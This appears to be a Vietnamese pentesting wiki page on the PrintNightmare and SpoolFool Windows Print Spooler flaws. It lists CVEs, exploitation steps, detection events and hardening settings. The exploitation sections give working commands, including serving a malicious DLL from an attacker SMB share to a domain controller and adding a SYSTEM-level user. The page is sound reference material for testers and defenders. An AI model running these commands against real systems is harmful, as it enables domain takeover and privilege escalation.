# PrintNightmare (RCE/LPE trên Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare là tên gọi chung của một nhóm lỗ hổng trong dịch vụ **Print Spooler** của Windows, cho phép **thực thi mã tùy ý với quyền SYSTEM** và, khi có thể truy cập spooler qua RPC, **thực thi mã từ xa (RCE) trên bộ điều khiển miền và máy chủ tệp**. Các CVE bị khai thác nhiều nhất là **CVE-2021-1675** (ban đầu được phân loại là LPE) và **CVE-2021-34527** (RCE đầy đủ). Các vấn đề tiếp theo như **CVE-2021-34481 (“Point & Print”)** và **CVE-2022-21999 (“SpoolFool”)** cho thấy bề mặt tấn công vẫn chưa được khắc phục triệt để.

Nếu bạn đang tìm hiểu về **ép xác thực / relay** thông qua spooler thay vì **RCE/LPE dựa trên driver**, hãy xem [trang khác về lạm dụng printer coercion](printers-spooler-service-abuse.md). Trang này tập trung vào **việc tải driver / DLL với quyền SYSTEM**.

---

## 1. Các thành phần dễ bị tấn công & CVE

| Năm | CVE | Tên ngắn | Kỹ thuật cơ bản | Ghi chú |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Được vá trong bản cập nhật tích lũy tháng 6 năm 2021 nhưng bị vượt qua bởi CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` cho phép người dùng đã xác thực tải DLL driver từ một share từ xa; sau tháng 8 năm 2021, thao tác này thường yêu cầu các chính sách Point & Print bị nới lỏng|
|2021|CVE-2021-34481|“Point & Print”|LPE|Người dùng không phải admin có thể cài đặt driver chưa ký|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Tạo thư mục tùy ý → cài DLL độc hại – hoạt động sau các bản vá năm 2021|

Tất cả đều lạm dụng một trong các **phương thức RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) hoặc các quan hệ tin cậy bên trong **Point & Print**.

## 2. Các kỹ thuật khai thác

### 2.1 Chiếm quyền điều khiển Domain Controller từ xa (CVE-2021-34527)

Người dùng miền đã xác thực nhưng **không có đặc quyền** có thể chạy DLL tùy ý với quyền **NT AUTHORITY\SYSTEM** trên một spooler từ xa (thường là DC) bằng cách:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Các PoC phổ biến gồm **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) và các module `misc::printnightmare / lsa::addsid` của Benjamin Delpy trong **mimikatz**.

### 2.2 Leo thang đặc quyền cục bộ (mọi phiên bản Windows được hỗ trợ, 2021-2024)

Có thể gọi cùng API **cục bộ** để tải driver từ `C:\Windows\System32\spool\drivers\x64\3\` và đạt được đặc quyền SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Phân loại hiện đại trên các máy chủ đã cập nhật

Trên một máy chủ đã được cập nhật đầy đủ, các PoC PrintNightmare công khai thường thất bại vì Windows hiện mặc định chỉ cho phép **quản trị viên** cài đặt driver máy in (`RestrictDriverInstallationToAdministrators=1` kể từ ngày 10 tháng 8 năm 2021). Trước khi thử khai thác mục tiêu, hãy kiểm tra xem môi trường có hoàn tác thay đổi an toàn này để hỗ trợ triển khai máy in cũ hay không:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Hai giá trị cấu hình yếu đáng chú ý nhất thường là:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Từ Linux, hãy nhanh chóng xác nhận mục tiêu công khai các giao diện print RPC liên quan trước khi chạy PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Một số công cụ công khai mới hơn cũng cung cấp cho bạn quy trình **check/list** an toàn hơn trước khi gửi một DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Nếu bạn nhận được `RPC_E_ACCESS_DENIED` (`0x8001011b`) khi dùng tài khoản có đặc quyền thấp, thường là bạn đang gặp cấu hình mặc định sau năm 2021, chứ không phải lỗi truyền tải.

> Trên Windows 11 22H2+ và các bản dựng client mới hơn, in từ xa mặc định dùng **RPC over TCP** và tắt **RPC over named pipes** (`\PIPE\spoolss`), trừ khi được bật lại rõ ràng. Một số PoC cũ và ghi chú lab vẫn giả định named pipe có thể truy cập được.<sup>[[4]](#references)</sup>

### 2.4 Lạm dụng Package Point & Print trên các mạng đã “vá”

Nhiều môi trường doanh nghiệp vẫn **dễ bị tấn công do chính sách** sau các bản vá ban đầu năm 2021, vì quy trình của helpdesk hoặc print server vẫn yêu cầu người dùng không phải quản trị viên cài đặt/cập nhật driver. Trên thực tế, playbook tấn công sẽ là:

- Nếu các lời nhắc bảo mật bị tắt hoàn toàn, **PrintNightmare với DLL tùy ý kiểu cổ điển** vẫn là con đường ngắn nhất.
- Nếu bật `Only use Package Point and Print`, thường cần chuyển sang con đường dùng **driver có chữ ký và hỗ trợ package-aware** thay vì thả DLL thô.<sup>[[3]](#references)</sup>
- Nghiên cứu năm 2024 cho thấy **`Package Point and Print - Approved servers` tự nó không phải là ranh giới tin cậy vững chắc**: nếu kẻ tấn công có thể giả mạo hoặc chiếm quyền phân giải tên của một print server được phê duyệt, nạn nhân vẫn có thể bị chuyển hướng đến một server độc hại vượt qua các bước kiểm tra chính sách.<sup>[[4]](#references)</sup>
- Ngay cả khi kết hợp UNC hardening với việc buộc dùng RPC-over-SMB, cấu hình vẫn có thể thiếu ổn định vì các client hiện đại có thể **chuyển về RPC over TCP**.<sup>[[4]](#references)</sup>

Đây là lý do việc khai thác theo kiểu PrintNightmare hiện đại thường xoay quanh **lạm dụng chính sách triển khai máy in của doanh nghiệp** hơn là chạy lại nguyên xi PoC năm 2021.

### 2.5 SpoolFool (CVE-2022-21999) – vượt qua các bản sửa lỗi năm 2021

Các bản vá năm 2021 của Microsoft đã chặn việc tải driver từ xa nhưng **không siết chặt quyền thư mục**. SpoolFool lạm dụng tham số `SpoolDirectory` để tạo thư mục tùy ý bên dưới `C:\Windows\System32\spool\drivers\`, thả một payload DLL vào đó và buộc spooler tải DLL này:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Exploit hoạt động trên Windows 7 → Windows 11 và Server 2012R2 → 2022 đã cài đầy đủ bản vá, trước các bản cập nhật tháng 2 năm 2022<sup>[[2]](#references)</sup>

---

## 3. Phát hiện & săn tìm

* **Nhật ký PrintService** – bật kênh *Microsoft-Windows-PrintService/Operational* và theo dõi **Event ID 316** (đã thêm/cập nhật driver, thường có tên DLL) trong cả những lần thử thành công lẫn thất bại. Kết hợp với **Event ID 808/811** để phát hiện lỗi tải module/driver spooler đáng ngờ.
* **Sysmon** – `Event ID 7` (Image loaded) hoặc `11/23` (ghi/xóa tệp) bên trong `C:\Windows\System32\spool\drivers\*` khi tiến trình cha là **spoolsv.exe**.
* **Nguồn gốc tiến trình** – cảnh báo bất cứ khi nào **spoolsv.exe** khởi chạy `cmd.exe`, `rundll32.exe`, PowerShell hoặc tiến trình con không ký số bất thường.
* **Telemetry mạng** – các lượt tải SMB bất thường từ **spoolsv.exe** đến các share do attacker kiểm soát, hoặc lưu lượng RPC máy in bất thường từ máy chủ không nên hoạt động như print server, đều là những dấu hiệu có giá trị cao.

## 4. Giảm thiểu & tăng cường bảo mật

1. **Vá lỗi!** – Cài bản cập nhật tích lũy mới nhất trên mọi máy Windows có cài dịch vụ Print Spooler.
2. **Tắt spooler ở những nơi không cần thiết**, đặc biệt là trên Domain Controller:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Chặn kết nối từ xa** nhưng vẫn cho phép in cục bộ – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Chỉ cho phép quản trị viên sử dụng Point & Print** bằng cách đặt:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Hướng dẫn chi tiết trong Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Nếu yêu cầu kinh doanh buộc phải đặt `RestrictDriverInstallationToAdministrators=0`, hãy xem mọi chính sách máy in khác chỉ là **biện pháp giảm thiểu một phần**. Tối thiểu, hãy ưu tiên **driver hỗ trợ package**, bật **Only use Package Point and Print** và giới hạn **Package Point and Print - Approved servers** vào các print server rõ ràng trong forest.<sup>[[3]](#references)</sup>
6. **Không hoàn tác quyền riêng tư của printer RPC** chỉ để khắc phục lỗi ánh xạ máy in. Các môi trường đặt `RpcAuthnLevelPrivacyEnabled=0` đang gỡ bỏ biện pháp hardening được thêm vào để ứng phó với **CVE-2021-1678** và thường cần được xem xét kỹ hơn trong quá trình engagement.<sup>[[4]](#references)</sup>

---

## 5. Nghiên cứu / công cụ liên quan

* Các module [`printnightmare` của mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – triển khai Impacket tiêu chuẩn với các chế độ `-check`, `-list` và `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper tích hợp sẵn khả năng phân phối qua SMB, hỗ trợ nhiều mục tiêu và cả hai chế độ `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – lạm dụng driver máy in dễ bị tấn công do bạn cung cấp thông qua package Point & Print
* Exploit và bài phân tích SpoolFool
* Các micropatch của 0patch cho SpoolFool và những lỗi spooler khác

Nếu bạn muốn **ép xác thực** thông qua spooler thay vì tải driver, hãy chuyển đến [lạm dụng dịch vụ printer spooler](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Quản lý hành vi cài đặt driver mặc định mới của Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Hướng dẫn thực tế về PrintNightmare năm 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare vẫn chưa kết thúc](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
